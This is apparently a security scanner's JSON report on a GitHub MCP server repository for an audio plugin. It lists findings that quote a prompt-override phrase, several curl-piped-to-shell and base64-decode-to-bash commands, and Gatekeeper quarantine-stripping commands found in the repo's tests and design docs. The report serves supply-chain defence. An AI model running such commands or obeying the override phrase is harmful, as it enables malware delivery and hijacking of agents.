@@ -1,0 +1,140 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "AllegroMoltoV/audio-plugin-soko-kun",
+    "version": "dd684cb423293d2d3385aad8c6fab38dc3906491",
+    "download": "https://codeload.github.com/AllegroMoltoV/audio-plugin-soko-kun/tar.gz/dd684cb423293d2d3385aad8c6fab38dc3906491"
+  },
+  "archive_sha256": "957f884ed9c3fe0e78ea59d239a1b4581775923a8bbf05d109b80b61e58559b6",
+  "findings": [
+    {
+      "severity": "low",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/domain/author.test.ts",
+      "line": 56,
+      "evidence": "Ignore the previous instructions",
+      "file_sha256": "4633e651ed214355511a245ac9c8c1951c302aee8bc123b0c3552316ab663710"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/domain/readme-watch.test.ts",
+      "line": 17,
+      "evidence": "curl -fsSL https://example.com/install.sh | bash",
+      "file_sha256": "6a58752f00f87127da4f92e78d9fbacaea65245cc7425fa7e123a4db684d3769"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/domain/doc-scan.test.ts",
+      "line": 22,
+      "evidence": "curl x | sh",
+      "file_sha256": "208566c8eb7fd2bc23c10dc088d939f97440f162e90f8477d5513fe5b61d4054"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/domain/cron.test.ts",
+      "line": 476,
+      "evidence": "curl -fsSL https://example.com/install.sh | bash",
+      "file_sha256": "d849c85b0533d1f4d6c99f6b0edf77f848469247403aca55ba2e3fe7904ea54b"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/checks.test.ts",
+      "line": 414,
+      "evidence": "curl x | sh",
+      "file_sha256": "0b529e75676e5697d47b07dc2578db6fde4454baa549c58642c168c174e8869d"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/review/rules.test.ts",
+      "line": 224,
+      "evidence": "curl -fsSL https://example.com/install.sh | bash",
+      "file_sha256": "9b30ffba1613f6f63dc4085f7c79f8d8570cbce536cb474e251c75552a45bae0"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0103",
+      "summary": "Decodes a base64 payload and executes it",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/review/rules.test.ts",
+      "line": 229,
+      "evidence": "base64 -d | bash",
+      "file_sha256": "9b30ffba1613f6f63dc4085f7c79f8d8570cbce536cb474e251c75552a45bae0"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/test/review/rules.test.ts",
+      "line": 196,
+      "evidence": "xattr -rd com.apple.quarantine",
+      "file_sha256": "9b30ffba1613f6f63dc4085f7c79f8d8570cbce536cb474e251c75552a45bae0"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/src/review/guidance-patterns.mjs",
+      "line": 8,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "98c31577ebe90892b66c5aed08f7448799dc4e20ce7a51541fb43899ced4ae39"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "audio-plugin-soko-kun-dd684cb423293d2d3385aad8c6fab38dc3906491/docs/design/review-criteria.md",
+      "line": 29,
+      "evidence": "xattr -rd com.apple.quarantine",
+      "file_sha256": "4b43bfd64023f900208cc22a71453fc7699fa104ff2f90f08cfc68ab0c2c6d60"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "api.github.com",
+    "audio-soko-kun.allegromoltov.jp",
+    "cleveraudio.org",
+    "codeload.github.com",
+    "developer.apple.com",
+    "developers.cloudflare.com",
+    "discord.com",
+    "docs.github.com",
+    "evil.example",
+    "example.com",
+    "example.invalid",
+    "example.test",
+    "github.com",
+    "github.com.evil.example",
+    "glama.ai",
+    "lv2plug.in",
+    "mb-api.abuse.ch",
+    "obsproject.com",
+    "opencollective.com",
+    "qiita.com",
+    "raw.githubusercontent.com",
+    "registry.modelcontextprotocol.io",
+    "registry.npmjs.org",
+    "schema.org",
+    "soko-kun.allegromoltov.jp",
+    "spdx.org",
+    "speakerdeck.com",
+    "static.modelcontextprotocol.io",
+    "steinbergmedia.github.io",
+    "tidelift.com",
+    "token.actions.githubusercontent.com",
+    "www.sitemaps.org",
+    "www.w3.org"
+  ],
+  "install_script": false,
+  "score": "high"
+}
